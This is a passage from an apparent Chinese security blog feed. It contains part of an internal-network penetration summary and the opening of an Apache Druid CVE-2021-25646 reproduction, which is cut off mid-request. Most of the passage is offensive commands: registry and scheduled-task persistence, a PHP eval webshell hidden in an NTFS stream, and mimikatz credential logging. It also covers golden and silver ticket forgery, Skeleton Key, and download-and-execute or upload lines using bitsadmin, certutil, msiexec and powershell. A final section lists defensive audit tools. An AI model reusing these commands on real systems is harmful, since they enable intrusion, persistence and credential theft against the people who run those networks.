添加一个启动项</span><br><span class="line">REG add &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run&quot; &#x2F;v [启动名字] &#x2F;d &quot;C:\Windows\Temp\shell.exe&quot; &#x2F;f</span><br><span class="line"></span><br><span class="line"># 删除启动项</span><br><span class="line">REG delete &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run&quot; &#x2F;v [启动名字] &#x2F;f</span><br></pre></td></tr></table></figure><h4 id="Windows计划任务"><a href="#Windows计划任务" class="headerlink" title="Windows计划任务"></a>Windows计划任务</h4><p>利用前提</p><ol><li>必须通过其他手段拿到本地或者域管理账号密码</li><li>若在横向渗透过程中，要保证当前机器能netuse远程到目标机器上</li><li>目标机器开启了taskscheduler服务</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># 在目标机器上执行</span><br><span class="line">schtasks &#x2F;create &#x2F;tn &quot;task1&quot; &#x2F;u test.com\administrator &#x2F;p &quot;pas4W0rd&quot; &#x2F;tr &quot;c:\windows\system32\cmd.exe &#x2F;c whoami &gt; c:\\windows\\temp\\1.txt&quot;</span><br><span class="line"></span><br><span class="line">#远程</span><br><span class="line">schtasks &#x2F;create &#x2F;s target_ip &#x2F;u &quot;administrator&quot; &#x2F;p &quot;password&quot; &#x2F;RL HIGHEST &#x2F;f &#x2F;tn &quot;windowsUpdate&quot; &#x2F;windows&#x2F;tmp&#x2F;bit.txt &#x2F;sc DAYLY &#x2F;mo 1 &#x2F;ST 20:15  ??</span><br><span class="line"></span><br><span class="line"># 本地</span><br><span class="line">schtasks &#x2F;create &#x2F;tn &quot;360&quot; &#x2F;tr C:\Windows\Temp\360.exe &#x2F;sc DAILY &#x2F;st 10:00</span><br><span class="line"></span><br><span class="line"># 查找</span><br><span class="line">schtasks &#x2F;query &#x2F;s target_ip &#x2F;U &quot;administrator&quot; &#x2F;P &quot;password&quot; | findstr &quot;windowsUpdates&quot;</span><br><span class="line"></span><br><span class="line"># 删除</span><br><span class="line">schtasks &#x2F;delete &#x2F;F &#x2F;tn WindowsUpdates &#x2F;s target_ip &#x2F;U &quot;administrator&quot; &#x2F;P &quot;password&quot; </span><br></pre></td></tr></table></figure><h4 id="多地登陆管理员账号"><a href="#多地登陆管理员账号" class="headerlink" title="多地登陆管理员账号"></a>多地登陆管理员账号</h4><p>查看注册表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\TerminalServer\fSingleSessionPerUser</span><br></pre></td></tr></table></figure><p>1是不允许多地远程，</p><p>0,是允许，03以上的系统基本上默认都是为1不允许所以这里就需要我们更改这个</p><h4 id="隐藏文件"><a href="#隐藏文件" class="headerlink" title="隐藏文件"></a>隐藏文件</h4><h5 id="文件属性隐藏"><a href="#文件属性隐藏" class="headerlink" title="文件属性隐藏"></a>文件属性隐藏</h5><p>隐藏文件，这样只是简单的隐藏文件，在文件夹选项中勾选<code>显示隐藏的文件、文件夹或驱动器</code>就能显示隐藏文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">attrib +h eval.php</span><br></pre></td></tr></table></figure><p>打开电脑文件夹选项卡，取消<code>隐藏受保护的操作系统文件</code>勾选，把<code>隐藏文件和文件夹</code>下面的单选选择<code>显示隐藏的文件、文件夹和驱动器</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">attrib +s +a +h +r eval.php</span><br></pre></td></tr></table></figure><h5 id="利用ADS隐藏"><a href="#利用ADS隐藏" class="headerlink" title="利用ADS隐藏"></a>利用ADS隐藏</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo ^&lt;?php @eval($_POST[&#39;cmd&#39;]); ?^&gt; &gt; index.php:hidden.jpg</span><br></pre></td></tr></table></figure><p>这样子就生成了一个不可见的<code>shell</code> <code>hidden.jpg</code>，常规的文件管理器、type命令，dir命令、del命令发现都找不出那个<code>hidden.jpg</code>的。　使用<code>notepad index.php:hidden.jpg</code> 修改文件 或者 使用<code>dir /r </code>查看文件。删除文件，直接删除<code>index.php</code>即可。</p><h5 id="驱动级文件隐藏"><a href="#驱动级文件隐藏" class="headerlink" title="驱动级文件隐藏"></a>驱动级文件隐藏</h5><p>使用工具：<a href="http://www.xoslab.com/efl.html">Easy File Locker</a></p><p>如果你在网站目录未查找到相关文件，且系统目录存在存在以下文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">c:\WINDOWS\xlkfs.dat</span><br><span class="line">c:\WINDOWS\xlkfs.dll</span><br><span class="line">c:\WINDOWS\xlkfs.ini</span><br><span class="line">c:\WINDOWS\system32\drivers\xlkfs.sys</span><br></pre></td></tr></table></figure><p>清除</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1、查询服务状态：sc qc xlkfs</span><br><span class="line">2、停止服务：net stop xlkfs    # 服务停止以后，经驱动级隐藏的文件即可显现</span><br><span class="line">3、删除服务：sc delete xlkfs</span><br><span class="line">4、删除系统下面文件，重启系统，确认服务已经被清除</span><br></pre></td></tr></table></figure><h4 id="SSP-Security-Support-Provider"><a href="#SSP-Security-Support-Provider" class="headerlink" title="SSP(Security Support Provider)"></a>SSP(Security Support Provider)</h4><p><strong>原理</strong></p><p><a href="https://uknowsec.cn/posts/notes/%E5%9F%9F%E6%B8%97%E9%80%8F-%E5%9F%9F%E7%BB%B4%E6%9D%83.html">https://uknowsec.cn/posts/notes/%E5%9F%9F%E6%B8%97%E9%80%8F-%E5%9F%9F%E7%BB%B4%E6%9D%83.html</a></p><p><strong>利用</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">将mimikatz下的mimilib.dll 拷贝到 C:\windows\system32的目录下</span><br><span class="line"></span><br><span class="line">添加Security Packages</span><br></pre></td></tr></table></figure><p><img src="/images/image-20210110181328115.png" alt="image-20210110181328115"></p><p>重启成功，如果有用户成功登录到当前系统中,会在 c:\windows\system32 目录下生成一个用于记录登账账号密码的 kiwissp.log 文件</p><h4 id="黄金票据"><a href="#黄金票据" class="headerlink" title="黄金票据"></a>黄金票据</h4><p>Golden Ticket是通过伪造的 TGT（TicketGranting Ticket），因为只要有了高权限的TGT，那么就可以发送给TGS换取任意服务的ST。可以说有了金票就有了域内的最高权限。</p><p><strong>条件</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1、域名称</span><br><span class="line">2、域的SID值</span><br><span class="line">3、域的KRBTGT账户密码HASH</span><br><span class="line">4、伪造用户名，可以是任意的</span><br></pre></td></tr></table></figure><p>MSF 中使用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"># 在msf中先steal_token一个域管理员的进程，然后才可以执行下面的命令。一开始使用&#96;impersonate_token&#96;获取的域管理员身份不起作用。</span><br><span class="line"></span><br><span class="line">meterpreter &gt; steal_token 1964</span><br><span class="line">Stolen token with username: KING\administrator</span><br><span class="line">meterpreter &gt; dcsync</span><br><span class="line">dcsync       dcsync_ntlm  </span><br><span class="line">meterpreter &gt; dcsync_ntlm krbtgt</span><br><span class="line">[+] Account   : krbtgt</span><br><span class="line">[+] NTLM Hash : 16a358115102a4351ee2240d7f983b23</span><br><span class="line">[+] LM Hash   : 8968fb93cc3e6143a62930984b756f62</span><br><span class="line">[+] SID       : S-1-5-21-1100079753-1400930603-3000301551-502</span><br><span class="line">[+] RID       : 502</span><br><span class="line"></span><br><span class="line"># 生成黄金票据，会存放在本地的攻击机系统中</span><br><span class="line"></span><br><span class="line">golden_ticket_create -u [任意用户名] -d [所在域] -s [SID去除最后三个] -k [krbtgt的ntlm哈希] -t [保存文件的路径和名字]</span><br><span class="line"></span><br><span class="line">meterpreter &gt; golden_ticket_create -u administrator -d king.com -s S-1-5-21-1100079753-1400930603-3000301551 -k 16a358115102a4351ee2240d7f983b23 -t golden.kiribi</span><br><span class="line"></span><br><span class="line"># 删除目标机器其他票据</span><br><span class="line">meterpreter &gt; kerberos_ticket_list</span><br><span class="line">meterpreter &gt; kerberos_ticket_purge</span><br><span class="line"></span><br><span class="line"># 注入票据</span><br><span class="line">meterpreter &gt; kerberos_ticket_use golden.kiribi    # 直接使用</span><br></pre></td></tr></table></figure><h4 id="白银票据"><a href="#白银票据" class="headerlink" title="白银票据"></a>白银票据</h4><p>主要是制作<code>ST</code>票据，不会<code>KDC</code>交流，直接发送到服务确认。每次制造的票据只能用于访问一个服务。</p><p>域管理员上收集信息：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 获取域控sid</span><br><span class="line">whoami &#x2F;user</span><br><span class="line"></span><br><span class="line"># 获取 ntlm 哈希、和主机名</span><br><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot; &quot;exit&quot;&gt;log.txt</span><br></pre></td></tr></table></figure><p>在域用户上执行，会自动将票据注入。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;kerberos::golden &#x2F;domain:king.com &#x2F;sid:S-1-5-21-1100079753-1400930603-3000301551 &#x2F;target:WIN-8VSIF64RC10.king.com &#x2F;service:cifs &#x2F;rc4:&lt;1bd736c7b3fc68abd61863a15704a661 &#x2F;user:secquan &#x2F;ptt&quot;</span><br><span class="line"></span><br><span class="line">参数如下：</span><br><span class="line">domain:  域</span><br><span class="line">sid：    域管理员的sid</span><br><span class="line">target： 域控主机名+域</span><br><span class="line">service：要伪造服务票据</span><br><span class="line">rc4：    是 administrator$ 的ntlm哈希，不是 administrator 的哈希，也就是server的哈希</span><br><span class="line">user：   随便指定一个用户</span><br></pre></td></tr></table></figure><p>只要记录下域管理员的 主机名、服务的哈希、域管理员的sid，下次按需生成服务白银票据。</p><h4 id="检测域内密码修改"><a href="#检测域内密码修改" class="headerlink" title="检测域内密码修改"></a>检测域内密码修改</h4><p>工具：<a href="https://github.com/Jumbo-WJB/Misc-Windows-Hacking">https://github.com/Jumbo-WJB/Misc-Windows-Hacking</a></p><p>只需要文件夹中的<code>HookPasswordChange.dll</code>和<code>Invoke-ReflectivePEInjection.ps1</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 导入包</span><br><span class="line">powershell.exe -ExecutionPolicy Bypass -File Invoke-ReflectivePEInjection.ps1</span><br><span class="line"></span><br><span class="line"># 然后修改密码，密码就会被保存在 C:\windows\temp\password.txt </span><br></pre></td></tr></table></figure><h4 id="Skeleton-Key"><a href="#Skeleton-Key" class="headerlink" title="Skeleton Key"></a>Skeleton Key</h4><p>Skeleton Key被安装在64位的域控服务器上,支持Windows Server2003到Windows Server2012 R2,能够让所有域用户使用同一个万能密码（默认密码为”mimikatz”）进行登录，现有的所有域用户使用原密码仍能继续登录，注意并不能更改用户权限。</p><p>由于 Skeleton Key 是被注入到 lsass.exe 进程的，所以它只存在于内存中，如果域控制器重启，注入的 Skeleton Key 将会失效。</p><p><strong>利用</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># 在域控主机上运行 mimikatz</span><br><span class="line"></span><br><span class="line">privilege::debug</span><br><span class="line"></span><br><span class="line">misc::skeleton</span><br><span class="line"></span><br><span class="line"># 在域主机上</span><br><span class="line">net use \\[域控主机名].king.com\c$ mimikatz &#x2F;user:administrator@king.com</span><br><span class="line"></span><br><span class="line">这时候就能查看域控主机</span><br><span class="line">dir \\WIN-8VSIF64RC10.king.com\c$</span><br></pre></td></tr></table></figure><h4 id="域内委派攻击"><a href="#域内委派攻击" class="headerlink" title="域内委派攻击"></a>域内委派攻击</h4><p>委派功能只有<code>服务账号</code>和<code>主机账号</code>才有委派功能，普通域内用户或域控是没有的。</p><h5 id="非约束委派攻击"><a href="#非约束委派攻击" class="headerlink" title="非约束委派攻击"></a>非约束委派攻击</h5><p><strong>所需工具</strong>：<a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1">https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1</a></p><p><strong>原理</strong>：<code>用户</code>需要访问<code>主机1</code>上的<code>HTTP服务</code>，而<code>HTTP服务</code>需要请求其他主机的<code>SQLServer数据库</code>，但是<code>主机1</code>并不知道用户是否有权限访问<code>SQLServer</code>，这时<code>HTTP服务</code>会利用<code>用户的TGT</code>的身份去访问<code>KDC</code>，如果<code>用户</code>有权限访问<code>SQLServer服务</code>才能访问成功。这就是非约束委派的过程。实际上就是将用户自己的TGT委派了一个服务账号，该服务访问任何服务都会带上用户的TGT，因此会再服务机器上留下用户的TGT。</p><p>在域控上执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># 导入工具</span><br><span class="line">Set-ExecutionPolicy Bypass -Scope Process -Force</span><br><span class="line">Import-Module .\PowerView.ps1</span><br><span class="line"></span><br><span class="line"># 查看非约束委派的用户</span><br><span class="line">Get-NetUser -Unconstrained -Domain king.com</span><br><span class="line"></span><br><span class="line"># 查看非约束委派的计算机</span><br><span class="line">Get-NetComputer -Unconstrained -Domain king.com</span><br><span class="line"></span><br><span class="line">把已经控制的主机用户设置为非约束委派，并且服务被其他主机访问的情况下才可继续利用</span><br></pre></td></tr></table></figure><p>在域内主机上用本地管理员登录，执行一下命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 使用mimikatz导出主机中的所有凭证，找到如下的administrator的TGT凭证</span><br><span class="line">privilege::debug    </span><br><span class="line">sekurlsa::tickets &#x2F;export</span><br></pre></td></tr></table></figure><p><img src="/images/image-20210116105039417.png" alt="image-20210116105039417"></p><p>将凭证添注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptt xxx.kirbi</span><br></pre></td></tr></table></figure><p><img src="/images/image-20210116105528377.png" alt="image-20210116105528377"></p><h5 id="约束委派攻击"><a href="#约束委派攻击" class="headerlink" title="约束委派攻击"></a>约束委派攻击</h5><p>非约束性委派（Unconstrained Delegation），服务账号可以获取某用户的TGT，<strong>从而服务账号可使用该TGT</strong>，模拟用户访问任意服务</p><p>约束性委派，服务账号只能获取用户委派的服务的票据，从而服务账号可使用该票据，只能访问指定的服务</p><h2 id="文件传输"><a href="#文件传输" class="headerlink" title="文件传输"></a>文件传输</h2><h3 id="powershell"><a href="#powershell" class="headerlink" title="powershell"></a>powershell</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 文件上传</span><br><span class="line">powershell (New-Object System.Net.WebClient).UploadFile(&#39;http:&#x2F;&#x2F;10.11.0.4&#x2F;upload.php&#39;, &#39;important.docx&#39;)</span><br><span class="line"></span><br><span class="line"># 文件下载</span><br><span class="line">powershell -exec bypass -c (new-object System.Net.WebClient).DownloadFile(&#39;http:&#x2F;&#x2F;192.168.111.1:8080&#x2F;test&#x2F;putty.exe&#39;,&#39;C:\Users\linghuchong\Desktop\Tools\putty1.exe&#39;)</span><br><span class="line">putty1.exe</span><br></pre></td></tr></table></figure><h3 id="bitsadmin"><a href="#bitsadmin" class="headerlink" title="bitsadmin"></a>bitsadmin</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bitsadmin &#x2F;transfer n http:&#x2F;&#x2F;domain&#x2F;file c:\windows\temp\shell.exe</span><br></pre></td></tr></table></figure><p>此工具还能够用下载并执行后门</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#创建一个下载任务：</span><br><span class="line">bitsadmin &#x2F;create backdoor</span><br><span class="line">#添加文档：</span><br><span class="line">bitsadmin &#x2F;addfile backdoor %comspec%  %temp%\cmd.exe</span><br><span class="line">#设置下载成功之后要执行的命令：</span><br><span class="line">bitsadmin.exe &#x2F;SetNotifyCmdLine backdoor regsvr32.exe &quot;&#x2F;u &#x2F;s &#x2F;i:https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;3gstudent&#x2F;SCTPersistence&#x2F;master&#x2F;calc.sct scrobj.dll&quot;</span><br><span class="line">#执行任务：</span><br><span class="line">bitsadmin &#x2F;Resume backdoor</span><br></pre></td></tr></table></figure><h3 id="certutil"><a href="#certutil" class="headerlink" title="certutil"></a>certutil</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">certutil.exe -urlcache -split -f http:&#x2F;&#x2F;192.168.111.1:8080&#x2F;test&#x2F;putty.exe</span><br><span class="line">certutil.exe -urlcache -split -f http:&#x2F;&#x2F;192.168.111.1:8080&#x2F;test&#x2F;putty.exe delete  #删除缓存</span><br><span class="line">putty.exe</span><br></pre></td></tr></table></figure><p>可以实现绕过杀软</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 编码要上传的exe到txt格式</span><br><span class="line">CertUtil -encode frpc.exe frpc.txt</span><br><span class="line"># 下载txt文件</span><br><span class="line">certutil.exe -urlcache -split -f frpc.txt的地址</span><br><span class="line"># 将txt文件编码成exe文件</span><br><span class="line">CertUtil -decode frpc.txt frpc.exe</span><br></pre></td></tr></table></figure><h3 id="nc"><a href="#nc" class="headerlink" title="nc"></a>nc</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 8888 &gt; fileName</span><br><span class="line">nc 1.1.1.1 8888 &lt; fileName</span><br></pre></td></tr></table></figure><h3 id="msiexec"><a href="#msiexec" class="headerlink" title="msiexec"></a>msiexec</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msiexec &#x2F;q &#x2F;i http:&#x2F;&#x2F;1.1.1.1&#x2F;test.txt</span><br></pre></td></tr></table></figure><h2 id="安全审计"><a href="#安全审计" class="headerlink" title="安全审计"></a>安全审计</h2><h3 id="Lynis"><a href="#Lynis" class="headerlink" title="Lynis"></a>Lynis</h3><p><a href="https://github.com/CISOfy/lynis">Lynis</a>是一款Unix系统的安全审计以及加固工具，能够进行深层次的安全扫描，其目的是检测潜在的时间并对未来的系统加固提供建议。这款软件会扫描一般系统信息，脆弱软件包以及潜在的错误配置。</p><h3 id="golismero"><a href="#golismero" class="headerlink" title="golismero"></a>golismero</h3><p>GoLismero是一款开源的安全测试框架。目前，它的测试目标主要为网站。该框架采用插件模式，实现用户所需要的功能。GoLismero默认自带了导入、侦测、扫描、攻击、报告、UI六大类插件。通过这些插件，用户可以对目标网站进行DNS检测、服务识别、GEOIP扫描、Robots文件扫描、目录暴力枚举等几十项功能。通过插件方式，GoLismero还可以调用其他工具，如Exploit-DB、PunkSPIDER、Shodan、SpiderFoot、theHarvester。但已经许久不更新了。</p><h3 id="chkrootkit"><a href="#chkrootkit" class="headerlink" title="chkrootkit"></a>chkrootkit</h3><p>下载地址：<a href="http://www.chkrootkit.org/download/">http://www.chkrootkit.org/download/</a></p><p>Rootkit是一个特殊的恶意软件，它可隐藏自身以及指定的文件、进程、网络、链接、端口等信息。Rootkit可通过加载特殊的驱动修改系统内核，进而达到隐藏信息的目的。Rootkit的三要素就是：隐藏、操纵、收集数据。不同的操作系统会有不同的Rootkit，Linux系统中的Rootkit就被称为LinuxRootkit。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 下载</span><br><span class="line">wget ftp:&#x2F;&#x2F;ftp.pangeia.com.br&#x2F;pub&#x2F;seg&#x2F;pac&#x2F;chkrootkit.tar.gz</span><br><span class="line"></span><br><span class="line"># 编译</span><br><span class="line">make sense</span><br><span class="line"></span><br><span class="line"># 运行</span><br><span class="line">.&#x2F;chkrootkit</span><br></pre></td></tr></table></figure><h3 id="挖掘隐藏进程"><a href="#挖掘隐藏进程" class="headerlink" title="挖掘隐藏进程"></a>挖掘隐藏进程</h3><p>对于隐藏执行的程序，使用top、ps等命令是看不到的。因为ps和top命令是通过遍历<code>/proc</code>目录下的文件实现进程查看，而通过一些手段可以阻止这些命令访问某个指定的路径，这样就不能看到隐藏的进程。</p><h4 id="Sysdig"><a href="#Sysdig" class="headerlink" title="Sysdig"></a>Sysdig</h4><p>由于sysdig没有强依赖<code>/proc</code>来查看系统活动（尽管可用时还是会用）。它是检查每个系统调用，这样恶意进程就无所遁形</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -s https:&#x2F;&#x2F;s3.amazonaws.com&#x2F;download.draios.com&#x2F;stable&#x2F;install-sysdig | sudo bash</span><br></pre></td></tr></table></figure><p>查看CPU使用率</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sysdig -c topprocs_cpu</span><br></pre></td></tr></table></figure><p>查看网络连接情况</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sysdig -c topconns</span><br></pre></td></tr></table></figure><p>查看网络带宽占用最多的进程</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sysdig -c topprocs_net</span><br></pre></td></tr></table></figure><p>..</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;内网渗透总结&quot;&gt;&lt;a href=&quot;#内网渗透总结&quot; class=&quot;headerlink&quot; title=&quot;内网渗透总结&quot;&gt;&lt;/a&gt;内网渗透总结&lt;/h1&gt;&lt;p&gt;对内网渗透做了个总结，会持续更新、补充、修改……&lt;/p&gt;
&lt;h2 id=&quot;隧道、代理、端口转发&quot;&gt;&lt;a hr</summary>
      
    
    
    
    
    <category term="内网渗透专栏" scheme="http://example.com/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B8%93%E6%A0%8F/"/>
    
  </entry>
  
  <entry>
    <title>Apache Druid未授权命令执行(CVE-2021-25646)</title>
    <link href="http://example.com/2021/02/05/Apache-Druid%E6%9C%AA%E6%8E%88%E6%9D%83%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-CVE-2021-25646/"/>
    <id>http://example.com/2021/02/05/Apache-Druid%E6%9C%AA%E6%8E%88%E6%9D%83%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-CVE-2021-25646/</id>
    <published>2021-02-05T08:32:31.000Z</published>
    <updated>2021-02-05T08:37:00.983Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Apache-Druid未授权命令执行-CVE-2021-25646"><a href="#Apache-Druid未授权命令执行-CVE-2021-25646" class="headerlink" title="Apache Druid未授权命令执行(CVE-2021-25646)"></a>Apache Druid未授权命令执行(CVE-2021-25646)</h2><h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>Apache Druid包括执行用户提供的JavaScript的功能嵌入在各种类型请求中的代码。此功能在用于高信任度环境中，默认已被禁用。但是，在Druid 0.20.0及更低版本中，经过身份验证的用户发送恶意请求，利用Apache Druid漏洞可以执行任意代码。攻击者可直接构造恶意请求执行任意代码，控制服务器。</p><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>Apache Druid &lt; 0.20.1</p><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>下载<code>apache-druid-0.20:</code><a href="https://archive.apache.org/dist/druid/0.20.0/apache-druid-0.20.0-bin.tar.gz">https://archive.apache.org/dist/druid/0.20.0/apache-druid-0.20.0-bin.tar.gz</a></p><p>启动</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tar -xzvf apache-druid-0.20.0-bin.tar.gz</span><br><span class="line">cd apache-druid-0.20.0</span><br><span class="line">.&#x2F;bin&#x2F;start-micro-quickstart</span><br></pre></td></tr></table></figure><p>启动后服务绑定在8888端口，浏览器可以正常访问则表示环境启动成功</p><p><img src="https://raw.githubusercontent.com/h00ls/picGo/master/imagesimagesimage-20210204181647791.png" alt="img"></p><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>首先查看<code>/tmp</code>目录下的文件</p><p><img src="https://raw.githubusercontent.com/h00ls/picGo/master/imagesimagesimage-20210204181647791.png" alt="image-20210204181647791"></p><p>访问8888端口后，点击<code>Load data</code>，抓包</p><p><img src="https://raw.githubusercontent.com/h00ls/picGo/master/imagesimagesimage-20210204181647791.png" alt="image-20210204181708981"></p><p>具体内容如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;druid&#x2F;indexer&#x2F;v1&#x2F;sampler HTTP&#x2F;1.1</span><br><span class="line">Host: ip:prot</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10.16; rv:85.0) Gecko&#x2F;20100101 Firefox&#x2F;85.0</span><br><span class="line">Accept: application&#x2F;json, text&#x2F;plain, *&#x2F;*</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line">Content-Length: 1045</span><br><span class="line">Connection: close</span><br><span class="line"> </span><br><span class="line">&#123;&quot;type&quot;: &quot;index&quot;, &quot;spec&quot;: &#123;&quot;ioConfig&quot;: &#123;&quot;type&quot;: &quot;index&quot;, &quot;inputSource&quot;: &#123;&quot;type&quot;: &quot;inline&quot;, &quot;data&quot;: &quot;&#123;\&quot;isRobot\&quot;:true,\&quot;channel\&quot;:\&quot;#x\&quot;,\&quot;timestamp\&quot;:\&quot;2020-12-12T12:10:21.040Z\&quot;,\&quot;flags\&quot;:\&quot;x\&quot;,\&quot;isUnpatrolled\&quot;:false,\&quot;page\&quot;:\&quot;1\&quot;,\&quot;diffUrl\&quot;:\&quot;https:&#x2F;&#x2F;xxx.com\&quot;,\&quot;added\&quot;:1,\&quot;comment\&quot;:\&quot;Botskapande 